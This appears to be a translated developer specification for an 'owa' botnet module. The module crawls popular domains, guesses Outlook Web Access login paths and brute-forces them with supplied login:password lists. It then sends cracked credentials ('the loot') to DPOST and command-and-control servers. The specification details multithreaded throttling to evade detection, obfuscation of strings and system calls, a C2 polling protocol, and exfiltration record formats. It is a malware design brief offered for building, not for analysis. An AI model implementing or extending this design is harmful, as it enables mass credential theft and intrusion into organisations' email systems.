JOB FOR THE PASSWORD RECOVERY MODULE FOR OUTLOOK WEB ACCESS (OWA)

The purpose of the module is distributed password matching for OWA

* Marked (deferred) means that this functionality does not need to be implemented yet.


PRINCIPLE OF OPERATION

The module receives the following information from the server in the form of configs:
- list of login:password to be picked up
- configuration list
- list of DPOST servers

The module consists of two parts:
- crawler
- scanner

The crawler generates the url to check.
The scanner checks them.

Principle of the crawler: random bypassing of domains from the top 500,000 list like Alexa.
The exact source of circumvention data is still unclear - Alexa has a paid subscription. We need to find an alternative.
s3.amazonaws.com/alexa-static/top-1m.csv.zip
For example, https://www.quantcast.com/top-sites/US/3

(set aside) Backup option: work on a hard-coded list of sites obtained from the server.

Next, the module:
1. takes the next site from the crawler output
2. checks the presence of the path /owa
3. checks the presence of the path mail.domain.com/owa
4. checks if webmail.domain.com/owa path exists
5. if owa is not found by any path, goto 1
7. takes the next login:password pair from the dictionary
8. sends an HTTP request for the login to owa.
9. if login fails, goto 7
10. if successful, we add the found combination to the list of found logins, as url|login|password


REALIZATION

0. The name of the project is owa.

When implementing, the following should be done (the description of the algorithm is greatly simplified):
1. brute-force should be performed in several threads.
The choice of a particular multithreading scheme is up to the developer.
The following variant could be suggested:
* the crawler runs in one thread, puts all found url's into a queue (protected by mutex).
The crawler threads (the number is limited) take several url to crawl from the queue (this is a variation of thread pooling).

Each scanning thread works on N randomly selected sites from the list.
If the login fails, the next site is taken, and the current site is put at the end of the queue.
That is, the brute force is performed cyclically on H sites, so as not to give a peak load on the same site.
If a password has been found for a site, it is removed from the queue.
- The number of threads is set by the compilation constant and the configuration from the config
- the module minimizes the number of calls to connect() to open a TCP connection. Between iterations, the connection should be kept
open until the server closes it. In that case, the connection should be reopened.
If an attempt to reopen the connection fails twice in a row, attempts to connect to that site are terminated for half an hour
(the constant is set at compile time).

2. you need to provide a delay in seconds between iterations of the fit (also a compilation constant and a setting from the config)

3. You need to set up a User-Agent. It should be configured as a compilation constant,
and as a module setting.

4. it should be stipulated that the site can react to cookies. For example, refuse to work if it does not receive cookies,
given to the original GET / HTTP/1.1

5. The module sends a list of found passwords every –ù minutes (set by compilation constant and configuration from config),
provided that new passwords have been found since the previous one.
The sending logic and protocol are described in the document "TOR for DPOST password grab.txt".

6. (delayed) if the brute-force does not give any results, you should start checking with the dictionary.
URLs of the dictionaries for downloading are taken from the config "list of settings".

7. The module is designed according to the rules of module development (see modules_HOWTO.txt)

8. The module sends the following events with owa tag:
- "Version build %DATE% %TIME%" (once at startup)
- "OWA passwords sent to DPOST server" when collected passwords are sent successfully
- "OWA passwords send failure: servers unavailable" when there are no available DPOST servers
- "No OWA passwords in range; trying dictionaries", if the entire list is finished, nothing is found, and the processing of dictionaries is started
- "No OWA passwords; give up", if work with dictionaries is done and nothing is found.
In this case, module should generate WantRelease event (see "module_HOWTO") to unload from memory

9. In this module, you can use C++ STL (std::string, containers) in a limited way.
   The use of std::mutex and synchronization primitives is forbidden - only
   WinAPI synchronization primitives (CRITICAL_SECTION etc).

10. 10. Obfuscate strings with Andrivet library (attached, see _STR() macro)

11. System calls should be obfuscated with library GetApi.h. Be careful, obfuscation of system calls may cause crashes.

12. The module must have two versions - x32- and x64-bit.

13. The battle assembly should be obfuscated as much as possible, with all debug output turned off.

14. The module must have a debug version. The debug output should be output to c:/temp/owa.log (the path to the log is configured in the macro).

15. The project must have a settings file config.h (the name does not matter, the important point - here are all the global settings - paths, macros-switches conditional compilation, etc.).

16. The module must work on all modern versions of Windows.
    The minimum supported version of Windows is Windows XP (if not possible, Windows Vista).

17. The project must be designed to be built in Microsoft Visual Studio at least 2015.

18. The Visual Studio project must be configured as follows:
* For ALL build profiles:
- Output directory: $(SolutionDir)Bin\$(PlatformTarget)\$(Configuration)\
- Intermediate directory: $(SolutionDir)\obj\$(Platform)\$(Configuration)\$(ProjectName)\
- Multiprocessor compilation: yes
* Release Profile:
- Debugging information format (C/C++ code creation): no
- Create debugging information (linker/debugger): no


CONFIGURES

The name of the config is a Ctl argument of the Control function, the content of the config is a CtlArg argument (see modules_HOWTO.txt)
All text in configs is case-sensitive; tags and service values must be in lowercase.
Configs must be in any one-byte encoding (ASCII is preferred).
XML comments are not allowed.

* settings
The config is a simple xml in the following format:
<owa>
<delay> delay between iterations of the fitting, in milliseconds</delay
<threads>number of threads to pick</threads>
<nurl> number of URLs checked by one thread</nurl>
<ua>user agent</ua>
(postpone)<dict1>URL of additional dictionary 1</dict1>
(postpone)<dict2>URL of additional dictionary 2</dict2>
(postpone)<dict3>URL of additional dictionary 3</dict3>
...
<dictN>URL of additional dictionary N</dictN>
</owa>

All parameters in this config are optional. If no parameter is specified, the compile time constant is used.

* dpost
The config is a simple xml in the following format:

<dpost>
<handler>http://11.22.33.44:8082</handler>
<handler>127.0.0.1:8083</handler>
</dpost>

The http/https prefix to the handler is optional. If it is specified, you should work with the specified protocol.
If it is not specified:
- if the port value is even, it works without encryption (HTTP), if the port is odd, it works over SSL/TLS (HTTPS).

The configuration contains a list of servers to which results should be sent via DPOST.

Sending format: plain text; line delimiter is \r\n, field delimiter is '|' (vertical slash).
Record format:

  url|user|password\r\n

* pw
A list of "username" "password" pairs.
Text in gzip packaging.
username|password\r\n string format

(postpone) *.

The config is a simple text list, separated by \r\n characters.
Each line is one domain name. It may or may not contain the http(s):// protocol prefix.
In this case, you should try both prefixes when bruteforcing.

(postponement) * dict.

The config is a simple text list, with \r\n characters separating the lines.
Each line is a login/password pair. The field separator is the '|' character (vertical slash).

(postpone) * ignore

The config is a simple text list, separated by \r\n characters.
Each line is a URL.
This will include addresses of top sites like gmail.
Addresses from this list should be ignored in the search. It is the address of the current domain being scanned,
not the domain part of the currently searched email address.


SECOND SECOND

The main changes of the second version:
- new verification mode
- work with the command server


TEST MODE

In this mode, the module does not look for new passwords, but checks the existing database for relevance.
Accordingly, in this mode:
- the scanner works not by Alexa list, but takes as input another email from the dictionary email:password
- The OWA URL search algorithm is preserved (guessing URLs of the form webmail.domain.com/owa)
- we check one specific email:password pair per domain (more precisely, based on the guessed OWA URL of this domain).
- we add the setting mode=check|brute, where check - check mode, brute - search and bruteforce mode (the logic of the first version).
Regarding configs and dictionaries, see below.

COMMAND SERVER AND CONFIGS

Previously, we used to get all the input data in the form of configs from the backend bots.
This is quite inconvenient for a variety of reasons - the backend's limitations on the size of configs,
restrictions on config management by the operator, lack of a common network status,
lack of specialized storage for results.

Instead, a command server will be used, from which we ask for settings and input lists,
and to which we give the loot.

In connection with this, all configs from the first version are abolished.
There is a new config srv, which contains a list of control server addresses,
separated by \r\n or \n, in address:port format.
If the port is even, it is HTTP, if it is odd - HTTPS.
If a protocol prefix (http/https) is specified, the prefix takes precedence over the specified port.
The module works with the control server that was reached first, for each request.

You can get the operating mode by sending an HTTP request to the server

GET /<group>/<clientid>/owa/mode HTTP/1.1
The group and clientid values are struct ParentInfo fields
 CHAR ParentID[256];
 CHAR ParentGroup[64];
(see module_HOWTO)

In the body of the HTTP response, the module expects the string brute or check.
Any other value is invalid - in that case the module makes repeated requests
every 5 minutes; the module won't start until it gets a correct answer.

The scanner receives a list of domains to check with an HTTP request to the server

Number of scanning threads:
GET /<group>/<clientid>/owa/th HTTP/1.1

The response is a non-negative number.
If atoi(answer) == 0, then the default number of threads = std::thread_concurrency() - 1.

GET /<group>/<clientid>/owa/domains HTTP/1.1
Response format:
address1[\r]\n
domain2[\r]\n
...
(one or many entries)

We let the server know when we complete the enumeration of the given list:

GET /<group>/<clientid>/owa/over HTTP/1.1

The server's response is the same as to the request /domains - a new list of domains to work with.
If an unexpected response (empty list, error code, etc.) module goes to idle (scanning is stopped)
and makes the same request once every 10 minutes (time is a constant).

We get the dictionary for the enumeration with an HTTP request to the control server:
GET /<group>/<clientid>/owa/dict HTTP/1.1

In response we get the dictionary either as text/plain or application/gzip (look at the Content-Type response header)
If the packaging is in gzip, then after unpacking we expect the same dictionary format as for plain text.
The format is:
email:password[\r]\n


Sending is done via the DPOST protocol (see the "TOR of the DPOST password grab" for a description of the protocol) with the request

 POST /<group>/<clientid>/owa/81 HTTP/1.1

The collected data is sent in a multipart/form-data container with source and data fields.
The value of the source field is "OWA Passwords".
Value of the data field: plain text, string delimiter \r\n
Record format:

owa|url|<username>|<password>\r\n
...
(one or many entries)

You can retrieve the frequency of namain data from the control server with an HTTP request
GET /<group>/<clientid>/owa/freq HTTP/1.1

In the body of the response we expect a number - this is the number of seconds, not more often than that the data should be sent.
If it is 0 - we send immediately when a new result is ready.
If it is a positive number - we accumulate records in the buffer and send once every X seconds,
clearing the buffer on successful sending.

We let the server know when we complete the enumeration of the given list:

GET /<group>/<clientid>/owa/over HTTP/1.1

The server's response is the same as to the request /domains - a new list of domains to work with.
If an unexpected response (empty list, error code, etc.) module goes to idle (scanning is stopped)
and makes the same request once every 10 minutes (time is a constant).
